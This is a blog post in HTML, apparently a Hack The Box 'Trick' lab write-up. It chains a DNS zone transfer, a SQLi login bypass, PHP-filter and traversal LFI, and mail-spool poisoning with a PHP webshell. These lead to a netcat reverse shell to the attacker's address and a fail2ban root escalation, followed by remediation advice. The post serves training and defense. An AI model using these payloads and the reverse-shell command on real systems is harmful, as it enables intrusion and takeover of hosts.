@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/trick]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Trick (easy)">
+  <meta property="og:description" content="Black-box Linux box: a DNS zone transfer leaks hidden vhosts, SQLi and PHP-filter LFI leak creds and the nginx config, mail-log poisoning gives RCE as a user, and a writable fail2ban action escalates to root.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/trick.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Trick (easy)">
+  <meta name="twitter:description" content="Black-box Linux box: a DNS zone transfer leaks hidden vhosts, SQLi and PHP-filter LFI leak creds and the nginx config, mail-log poisoning gives RCE as a user, and a writable fail2ban action escalates to root.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Trick (easy)</h1>
+    <p class="post-meta">2026-09-29 &middot; <a class="post-cat" href="index.html#cat-htb-cpts-track-writeups">HTB &quot;CPTS Track&quot; writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/linux.html" data-tag="linux">#linux</a><a class="tag" href="tag/web.html" data-tag="web">#web</a><a class="tag" href="tag/dns-zone-transfer.html" data-tag="dns-zone-transfer">#dns-zone-transfer</a><a class="tag" href="tag/sql-injection.html" data-tag="sql-injection">#sql-injection</a><a class="tag" href="tag/lfi.html" data-tag="lfi">#lfi</a><a class="tag" href="tag/php-filters.html" data-tag="php-filters">#php-filters</a><a class="tag" href="tag/smtp-mail-spool-poisoning.html" data-tag="smtp-mail-spool-poisoning">#smtp-mail-spool-poisoning</a><a class="tag" href="tag/fail2ban.html" data-tag="fail2ban">#fail2ban</a><a class="tag" href="tag/bash-suid.html" data-tag="bash-suid">#bash-suid</a><a class="tag" href="tag/path-traversal.html" data-tag="path-traversal">#path-traversal</a></p>
+    <p class="post-abstract">Black-box Linux box: a DNS zone transfer leaks hidden vhosts, SQLi and PHP-filter LFI leak creds and the nginx config, mail-log poisoning gives RCE as a user, and a writable fail2ban action escalates to root.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#port-80-dead-end">Port 80: dead end</a></li>
+<li><a href="#port-53-dns-is-the-way-in">Port 53: DNS is the way in</a></li>
+</ul>
+</li>
+<li><a href="#foothold-recon-the-payroll-vhost">Foothold Recon: the payroll vhost</a><ul>
+<li><a href="#leaking-the-enemigosss-password">Leaking the Enemigosss password</a></li>
+<li><a href="#lfi-via-php-filters">LFI via PHP filters</a></li>
+<li><a href="#reading-the-nginx-config-via-sqli-file-privilege">Reading the nginx config via SQLi FILE privilege</a></li>
+</ul>
+</li>
+<li><a href="#user-lfi-mail-log-poisoning-to-rce-as-michael">User: LFI + Mail-Log Poisoning to RCE as michael</a><ul>
+<li><a href="#poisoning-the-mailbox">Poisoning the mailbox</a></li>
+<li><a href="#triggering-the-reverse-shell">Triggering the reverse shell</a></li>
+</ul>
+</li>
+<li><a href="#root-writable-fail2ban-action-sudo-restart">Root: Writable fail2ban Action + sudo Restart</a></li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/trick1.png" /></p>
+<p>Trick is a black-box Linux box that rewards enumeration over exploitation. There's no CVE to fire here, the whole path is misconfiguration: an exposed DNS server hands you hidden vhosts, two of those vhosts are riddled with SQLi and LFI, and the root step abuses a service account that can restart fail2ban but also happens to own its config directory. The chain end to end:</p>
+<ol>
+<li><strong>DNS zone transfer</strong> off the box's own BIND server leaks the <code>preprod-payroll</code> vhost that isn't reachable any other way.</li>
+<li>A <strong>SQLi auth bypass</strong> gets me into the payroll admin panel; a second SQLi (MySQL <code>FILE</code> privilege) plus a <strong>PHP-filter LFI</strong> leak DB creds and the nginx config, which exposes a second vhost, <code>preprod-marketing</code>.</li>
+<li>The marketing vhost has a <strong>path-traversal LFI</strong>. I poison the SMTP mail spool (<code>/var/mail/michael</code>) with a PHP webshell and include it for <strong>RCE as michael</strong> (that vhost's PHP-FPM pool runs as michael, not www-data).</li>
+<li><code>michael</code>'s <strong>SSH private key</strong> gives a stable shell. user.txt.</li>
+<li><code>michael</code> is in the <code>security</code> group that owns fail2ban's <code>action.d/</code>, and he can <code>sudo fail2ban restart</code>. I swap the ban action for <code>chmod u+s /bin/bash</code>, trigger a ban with hydra, and drop into a <strong>SUID root</strong> shell.</li>
+</ol>
+<blockquote>
+<p>No assumed-breach creds here. Everything starts from an Nmap scan.</p>
+</blockquote>
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.227.180<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp open  smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid:
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+
+<p>Four ports, and two of them stand out. SSH (22) and nginx (80) are expected. The interesting pair is <strong>SMTP on 25</strong> and <strong>BIND DNS on 53</strong>. A DNS server sitting on a web box is a gift, it means I can ask the box about itself, and mail service usually means there's a mailbox somewhere I can write to later. The web root is just a "Coming Soon" Bootstrap template, so the real content is probably hiding behind vhosts.</p>
+<h3 id="port-80-dead-end">Port 80: dead end<a class="headerlink" href="#port-80-dead-end" title="link to this section">&para;</a></h3>
+<p>Directory fuzzing the default site only turns up template boilerplate, nothing useful:</p>
+<div class="codehilite"><pre><span></span><code>ffuf<span class="w"> </span>-w<span class="w"> </span>directory-list-2.3-medium.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://10.129.227.180/FUZZ<span class="w"> </span>-ic
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>assets                  [Status: 301, Size: 185]
+css                     [Status: 301, Size: 185]
+js                      [Status: 301, Size: 185]
+</code></pre></div>
+
+<p><code>assets</code>, <code>css</code>, <code>js</code>, the skeleton of a static theme. No app here. I also glanced at the nginx version (1.14.2) to see if there was a known bug worth chasing, but nothing lined up with this box, so I dropped it and moved to DNS:</p>
+<p><img alt="" src="../images/trick2.png" /></p>
+<h3 id="port-53-dns-is-the-way-in">Port 53: DNS is the way in<a class="headerlink" href="#port-53-dns-is-the-way-in" title="link to this section">&para;</a></h3>
+<p>First, a reverse lookup against the box's own DNS server to learn what it calls itself:</p>
+<div class="codehilite"><pre><span></span><code>dig<span class="w"> </span>-x<span class="w"> </span><span class="m">10</span>.129.227.180<span class="w"> </span>@10.129.227.180
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>;; ANSWER SECTION:
+180.227.129.10.in-addr.arpa. 604800 IN  PTR trick.htb.
+
+;; AUTHORITY SECTION:
+227.129.10.in-addr.arpa. 604800 IN  NS  trick.htb.
+</code></pre></div>
+
+<p>The domain is <code>trick.htb</code>, and the box is authoritative for it. Add it to hosts:</p>
+<div class="codehilite"><pre><span></span><code><span class="m">10</span>.129.227.180<span class="w"> </span>trick.htb
+</code></pre></div>
+
+<p>Since it's the authoritative nameserver, I try a full zone transfer (AXFR). That's the one query a nameserver should never answer for a stranger:</p>
+<div class="codehilite"><pre><span></span><code>dig<span class="w"> </span>axfr<span class="w"> </span>@trick.htb<span class="w"> </span>trick.htb
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>trick.htb.      604800  IN  SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.      604800  IN  NS  trick.htb.
+trick.htb.      604800  IN  A   127.0.0.1
+trick.htb.      604800  IN  AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why a zone transfer leaks this:</strong> AXFR is the mechanism a primary nameserver uses to replicate its entire zone to a secondary. If the server doesn't restrict who's allowed to request it (<code>allow-transfer</code>), anyone can pull the whole zone in one query, every record, including internal-only hostnames that were never meant to be public. Here it hands me <code>preprod-payroll.trick.htb</code>, a vhost that resolves to nothing without this record.</p>
+</blockquote>
+<p>Added the new name to my <code>/etc/hosts</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="m">10</span>.129.227.180<span class="w"> </span>trick.htb<span class="w"> </span>preprod-payroll.trick.htb
+</code></pre></div>
+
+<hr />
+<h2 id="foothold-recon-the-payroll-vhost">Foothold Recon: the payroll vhost<a class="headerlink" href="#foothold-recon-the-payroll-vhost" title="link to this section">&para;</a></h2>
+<p><code>preprod-payroll.trick.htb</code> serves an admin login:</p>
+<p><img alt="" src="../images/trick3.png" /></p>
+<p>An admin login on a "preprod" app is exactly the kind of thing that gets shipped with lazy auth, so I throw a classic SQL injection auth bypass at the username field:</p>
+<p><img alt="" src="../images/trick4.png" /></p>
+<div class="codehilite"><pre><span></span><code>sdsd' or '1'+'1';-- -
+</code></pre></div>
+
+<p>And it drops me straight into the dashboard as administrator:</p>
+<p><img alt="" src="../images/trick5.png" /></p>
+<blockquote>
+<p><strong>Why the auth bypass works:</strong> the login query is almost certainly built by string concatenation, something like <code>SELECT * FROM users WHERE user='$u' AND pass='$p'</code>. The payload closes the username string, adds <code>OR '1'+'1'</code> (which MySQL evaluates as truthy), and comments out the rest of the query with <code>-- -</code>, including the password check. The <code>WHERE</code> clause is now always true, so the app logs me in as the first user it finds, the admin.</p>
+</blockquote>
+<h3 id="leaking-the-enemigosss-password">Leaking the Enemigosss password<a class="headerlink" href="#leaking-the-enemigosss-password" title="link to this section">&para;</a></h3>
+<p>Poking around <code>Users &gt; Action &gt; Edit</code>, one account, <code>Enemigosss</code>, comes up with its password field pre-populated (a bad habit, edit forms shouldn't round-trip the plaintext):</p>
+<p><img alt="" src="../images/trick6.png" /></p>
+<p><img alt="" src="../images/trick7.png" /></p>
+<p>The field is masked in the UI, but the value has to reach the browser to populate the field. So I catch the request in Burp and read it straight out of the response:</p>
+<p><img alt="" src="../images/trick8.png" /></p>
+<p><strong><code>Enemigosss / SuperGucciRainbowCake</code></strong></p>
+<p>These creds don't get me anywhere new (no SSH, no SMTP auth with them), so I note them and keep looking.</p>
+<h3 id="lfi-via-php-filters">LFI via PHP filters<a class="headerlink" href="#lfi-via-php-filters" title="link to this section">&para;</a></h3>
+<p>The app's pages load through a <code>page</code> parameter, and it happily includes arbitrary <code>.php</code> files by name, that's local file inclusion:</p>
+<p><img alt="" src="../images/trick9.png" /></p>
+<p>Straight inclusion just executes the PHP, so I can't read source that way. This is where PHP filter wrappers come in (<a href="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">HackTricks: File Inclusion</a>):</p>
+<div class="codehilite"><pre><span></span><code>http://preprod-payroll.trick.htb/index.php?page=PHP://filter/convert.base64-encode/resource=login
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why <code>php://filter</code> turns LFI into source disclosure:</strong> normally an <code>include()</code> on a <code>.php</code> file runs it, so you see the output, not the code. The <code>convert.base64-encode</code> filter transforms the file's bytes before the include engine ever interprets them, so the target is base64-encoded into inert text and echoed back. The include never executes it. Decode the blob locally and you have the raw source. (The <code>php://</code> scheme is case-insensitive, which is handy if a naive filter blocks lowercase <code>php://</code>.)</p>
+</blockquote>
+<p>The response is a base64 blob:</p>
+<p><img alt="" src="../images/trick10.png" /></p>
+<p>Decode it in <a href="https://gchq.github.io/CyberChef/">CyberChef</a>:</p>
+<p><img alt="" src="../images/trick11.png" /></p>
+<p>The source references a couple of other files, and <code>db_connect.php</code> is the obvious one to grab next:</p>
+<div class="codehilite"><pre><span></span><code>http://preprod-payroll.trick.htb/index.php?page=PHP://filter/convert.base64-encode/resource=db_connect
+</code></pre></div>
+
+<p><img alt="" src="../images/trick12.png" /></p>
+<p>Decoded, it gives up the database credentials:</p>
+<p><img alt="" src="../images/trick13.png" /></p>
+<p><strong><code>remo / TrulyImpossiblePasswordLmao123</code></strong></p>
+<h3 id="reading-the-nginx-config-via-sqli-file-privilege">Reading the nginx config via SQLi FILE privilege<a class="headerlink" href="#reading-the-nginx-config-via-sqli-file-privilege" title="link to this section">&para;</a></h3>
+<p>There's a second, cleaner injection in <code>manage_user.php?id=</code>. I let sqlmap confirm it and enumerate the DB user's privileges:</p>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>--url<span class="w"> </span><span class="s2">"preprod-payroll.trick.htb/manage_user.php?id=3"</span><span class="w"> </span>--privileges
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Parameter: id (GET)
+    Type: boolean-based blind
+    Type: time-based blind
+    Type: UNION query ... 8 columns
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+
+database management system users privileges:
+[*] 'remo'@'localhost' [1]:
+    privilege: FILE
+</code></pre></div>
+
+<p><code>remo</code> (the same DB user from <code>db_connect.php</code>) has the <strong><code>FILE</code></strong> privilege, which means MySQL can read files off disk for me. I use it to pull the nginx site config:</p>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>--url<span class="w"> </span><span class="s2">"preprod-payroll.trick.htb/manage_user.php?id=3"</span><span class="w"> </span>--file-read<span class="o">=</span><span class="s2">"/etc/nginx/sites-available/default"</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why <code>FILE</code> matters:</strong> the MySQL <code>FILE</code> privilege lets a query call <code>LOAD_FILE()</code> to read any file the mysqld process can read, and write files with <code>INTO OUTFILE</code>. Chained through an injection, it turns a SQLi into arbitrary file read on the host, no shell required. sqlmap just wraps that in <code>--file-read</code>.</p>
+</blockquote>
+<p>The retrieved config lists three server blocks, and the third is a vhost I hadn't seen:</p>
+<div class="codehilite"><pre><span></span><code>server {
+    server_name preprod-marketing.trick.htb;
+    root /var/www/market;
+    location ~ \.php$ {
+        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+    }
+}
+</code></pre></div>
+
+<p>There's a <strong><code>preprod-marketing.trick.htb</code></strong> vhost, added the host to my <code>/etc/hosts/</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="m">10</span>.129.227.180<span class="w"> </span>trick.htb<span class="w"> </span>preprod-payroll.trick.htb<span class="w"> </span>preprod-marketing.trick.htb
+</code></pre></div>
+
+<hr />
+<h2 id="user-lfi-mail-log-poisoning-to-rce-as-michael">User: LFI + Mail-Log Poisoning to RCE as michael<a class="headerlink" href="#user-lfi-mail-log-poisoning-to-rce-as-michael" title="link to this section">&para;</a></h2>
+<p>The marketing site has the same <code>page</code> include pattern:</p>
+<p><img alt="" src="../images/trick14.png" /></p>
+<p>But <code>php://filter</code> is filtered here. Plain <code>../</code> is stripped too, so I fall back to a traversal-filter bypass (<a href="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">HackTricks: File Inclusion</a>):</p>
+<div class="codehilite"><pre><span></span><code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
+</code></pre></div>
+
+<p><img alt="" src="../images/trick15.png" /></p>
+<blockquote>
+<p><strong>Why <code>....//</code> gets through:</strong> the filter does a single, non-recursive pass that removes <code>../</code> sequences. Feed it <code>....//</code> and after it deletes the inner <code>../</code> what's left is <code>../</code>, the traversal it was trying to block. Any filter that sanitizes once instead of looping is vulnerable to this.</p>
+</blockquote>
+<p><code>/etc/passwd</code> confirms a login user, <strong>michael</strong>. Now I have file <em>read</em> on the box and a mailbox I can write to (SMTP on 25). That combination is a classic LFI-to-RCE via log poisoning: write PHP into a file the target will <code>include()</code>.</p>
+<h3 id="poisoning-the-mailbox">Poisoning the mailbox<a class="headerlink" href="#poisoning-the-mailbox" title="link to this section">&para;</a></h3>
+<p>I talk to Postfix directly over telnet and send michael a message whose body is a tiny PHP webshell:</p>
+<div class="codehilite"><pre><span></span><code>telnet 10.129.227.180 25
+
+MAIL FROM: 1kb2
+RCPT TO: michael NOTIFY=success,failure
+DATA
+&lt;?=`$_GET[0]`?&gt;
+.
+250 2.0.0 Ok: queued as 0BD3D409A3
+</code></pre></div>
+
+<p><img alt="" src="../images/trick16.png" /></p>
+<p>The message lands in <code>/var/mail/michael</code>. <code>&lt;?=`$_GET[0]`?&gt;</code> is shorthand for "echo the output of shell-executing whatever comes in as GET parameter <code>0</code>".</p>
+<blockquote>
+<p><strong>Why log/mail poisoning works:</strong> LFI executes whatever PHP is in the file it includes. Any file an attacker can write attacker-controlled text into, an access log, an auth log, or here the mail spool, becomes a code-drop. Include <code>/var/mail/michael</code>, the PHP body runs, and because this vhost's FPM pool runs as michael, so does my code.</p>
+</blockquote>
+<h3 id="triggering-the-reverse-shell">Triggering the reverse shell<a class="headerlink" href="#triggering-the-reverse-shell" title="link to this section">&para;</a></h3>
+<p>Include the poisoned mailbox and pass the reverse-shell command in <code>0</code>:</p>
+<div class="codehilite"><pre><span></span><code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&amp;0=busybox%20nc%2010.10.14.137%206767%20-e%20sh
+</code></pre></div>
+
+<p>With a listener on <code>6767</code>, that gives a shell as michael:</p>
+<p><img alt="" src="../images/trick17.png" /></p>
+<p>michael's <code>.ssh</code> directory has a private key, so I grab it for a stable, non-janky shell instead of living in the netcat session:</p>
+<div class="codehilite"><pre><span></span><code>/home/michael/.ssh
+-rw-------  1 michael michael 1.8K May 12  2022 id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+... (trimmed) ...
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div>
+
+<p>Save it locally, tighten permissions, and log in:</p>
+<div class="codehilite"><pre><span></span><code>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>michael@10.129.227.180
+</code></pre></div>
+
+<p><img alt="" src="../images/trick18.png" /></p>
+<div class="codehilite"><pre><span></span><code>michael@trick:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong></p>
+<hr />
+<h2 id="root-writable-fail2ban-action-sudo-restart">Root: Writable fail2ban Action + sudo Restart<a class="headerlink" href="#root-writable-fail2ban-action-sudo-restart" title="link to this section">&para;</a></h2>
+<p>Check what michael can run as root, and what groups he's in:</p>
+<div class="codehilite"><pre><span></span><code>michael@trick:~$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
+
+michael@trick:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+User<span class="w"> </span>michael<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>trick:
+<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/etc/init.d/fail2ban<span class="w"> </span>restart
+</code></pre></div>
+
+<p>Two facts to line up: michael is in the <strong><code>security</code></strong> group, and he can restart <strong>fail2ban</strong> as root with no password. Look at fail2ban's action directory:</p>
+<div class="codehilite"><pre><span></span><code>michael@trick:/etc/fail2ban$<span class="w"> </span>ls<span class="w"> </span>-lah
+drwxrwx---<span class="w">   </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>security<span class="w"> </span><span class="m">4</span>.0K<span class="w"> </span>action.d
+</code></pre></div>
+
+<p><code>action.d</code> is owned by <code>root:security</code> and is group-writable. michael can't edit the files inside directly (they're <code>root:root</code>):</p>
+<div class="codehilite"><pre><span></span><code>michael@trick:/etc/fail2ban/action.d$<span class="w"> </span>chmod<span class="w"> </span>g+w<span class="w"> </span>iptables-multiport.conf
+chmod:<span class="w"> </span>changing<span class="w"> </span>permissions<span class="w"> </span>of<span class="w"> </span><span class="s1">'iptables-multiport.conf'</span>:<span class="w"> </span>Operation<span class="w"> </span>not<span class="w"> </span>permitted
+</code></pre></div>
+
+<p>But write access on the <em>directory</em> is enough: I can delete a file and drop a replacement with the same name.</p>
+<blockquote>
+<p><strong>Why this is a root escalation:</strong> fail2ban runs as root. Its action files (<code>action.d/*.conf</code>) define the shell commands it runs when it bans or unbans an IP. If I control the contents of an action file and can make fail2ban reload it (the sudo restart) and then fire (trigger a ban), I get arbitrary command execution as root. The file being <code>root:root</code> doesn't save it, because write on the parent directory lets me <code>rm</code> the original and <code>mv</code> my own version into its place.</p>
+</blockquote>
+<p>Rewrite the ban action so that instead of adding an iptables rule, it makes <code>/bin/bash</code> SUID root. Because I can't edit in place, I build the modified file in my home directory, delete the original, and move mine in:</p>
+<div class="codehilite"><pre><span></span><code>sed<span class="w"> </span><span class="s2">"s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/chmod u+s \/bin\/bash/g"</span><span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf<span class="w"> </span>&gt;<span class="w"> </span>config.conf
+
+rm<span class="w"> </span>-f<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
+
+mv<span class="w"> </span>config.conf<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
+
+sudo<span class="w"> </span>/etc/init.d/fail2ban<span class="w"> </span>restart
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+</code></pre></div>
+
+<p>The config is loaded, but the action only runs when a ban actually fires. So I generate failed SSH logins from my attack box to trip the jail:</p>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span><span class="m">10</span>.129.227.180<span class="w"> </span>ssh<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz
+</code></pre></div>
+
+<p>I don't care about cracking anything, I just need enough failed attempts to trigger a ban, which runs my poisoned action as root. A moment later <code>/bin/bash</code> is SUID:</p>
+<div class="codehilite"><pre><span></span><code>michael@trick:~$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/bin/bash
+-rwsr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1168776</span><span class="w"> </span>Apr<span class="w"> </span><span class="m">18</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>/bin/bash
+</code></pre></div>
+
+<p><code>bash -p</code> keeps the effective UID of the SUID binary instead of dropping privileges:</p>
+<div class="codehilite"><pre><span></span><code>michael@trick:~$<span class="w"> </span>bash<span class="w"> </span>-p
+bash-5.0#<span class="w"> </span>whoami
+root
+bash-5.0#<span class="w"> </span>cat<span class="w"> </span>/root/root.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Restrict zone transfers.</strong> Set <code>allow-transfer</code> to trusted secondaries only (or none). Leaking the full zone exposed the entire attack surface here.</li>
+<li><strong>Use parameterized queries.</strong> Both the login and <code>manage_user.php</code> were string-concatenated SQL. Prepared statements kill the auth bypass and the <code>FILE</code>-privilege read. Also, the DB account shouldn't have <code>FILE</code> at all, and the app shouldn't reflect stored passwords back to edit forms.</li>
+<li><strong>Don't build includes from user input.</strong> <code>include($_GET['page'])</code> is the root cause of both LFIs. Whitelist the pages that may be loaded, and disable PHP wrapper schemes (<code>allow_url_include</code>, and filter/wrapper usage) where they aren't needed.</li>
+<li><strong>Lock down the mail spool.</strong> A web-reachable LFI plus a writable mailbox is what enabled RCE. Separate the web user from real login users and keep <code>/var/mail</code> out of any include-able path.</li>
+<li><strong>Fix the fail2ban sudo combo.</strong> Granting a user's group write access to <code>action.d</code> while also letting that user restart fail2ban as root is a direct path to root. Remove group-write on the config, or don't grant the sudo restart, you need both to escalate.</li>
+</ul>
+<hr />
+<p>Reference used:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">HackTricks: File Inclusion / LFI (php://filter and traversal bypasses)</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="jeeves.html">HTB CPTS Track: Jeeves (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a></span></li>
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
